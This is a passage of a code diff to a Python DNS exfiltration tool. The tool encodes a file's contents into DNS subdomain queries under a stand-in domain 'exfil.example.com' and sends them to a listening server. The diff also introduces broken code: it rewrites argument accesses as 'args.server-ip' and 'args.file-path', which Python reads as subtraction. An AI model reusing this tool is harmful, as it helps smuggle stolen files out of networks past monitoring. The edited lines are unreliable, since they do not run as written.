@@ -54,7 +54,7 @@ def send_dns_query(subdomain, args):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
         sock.settimeout(2)
-        sock.sendto(query_data, (args.server_ip, args.server_port))
+        sock.sendto(query_data, (args.server-ip, args.server-port))
         response, _ = sock.recvfrom(1024)
         print("Received response:", DNSRecord.parse(response))
     except socket.timeout:
@@ -65,7 +65,7 @@ def send_dns_query(subdomain, args):
 
 def main(args):
     identifier = str(uuid4()).replace('-', '')[:8]  # Unique identifier
-    encoded_data = encode_file_contents(args.file_path)
+    encoded_data = encode_file_contents(args.file-path)
     # Adjusted for additional '-' and sequence numbers
     # print(len(domain))
     max_length = 63 - len(identifier) - 16 - 3
@@ -85,11 +85,11 @@ def main(args):
 
 def get_args():
     parser = argparse.ArgumentParser(description="DNS Exfiltration Server")
-    parser.add_argument("--server_port", type=int, default=5300,
+    parser.add_argument("--server-port", type=int, default=5300,
                         help="The port on which the server listens")
-    parser.add_argument("--server_ip", type=str, default="127.0.0.1",
+    parser.add_argument("--server-ip", type=str, default="127.0.0.1",
                         help="The IP address of the server")
-    parser.add_argument("--file_path", default="output",
+    parser.add_argument("--file-path", default="output",
                         help="File to exfiltrate via DNS")
     parser.add_argument("--domain", type=str, default="exfil.example.com",
                         help="The domain to query")
